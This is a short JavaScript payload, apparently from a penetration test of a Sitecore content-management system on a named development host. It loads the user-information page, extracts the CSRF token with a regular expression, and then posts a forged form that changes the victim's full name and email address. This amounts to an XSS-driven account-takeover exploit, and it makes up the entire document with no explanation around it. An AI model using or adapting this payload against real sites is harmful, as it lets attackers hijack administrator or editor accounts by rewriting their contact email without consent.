var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="__CSRFTOKEN" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', true);
    changeReq.send('&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=1&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=374&__Y=571&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN='+token+'&__VIEWSTATE=343AB472B5D94A4EBD5E12A4D7DD5642&__VIEWSTATE=&Fullname=dxpPentetsUserxss&Email=lr%40moc.moc')
};
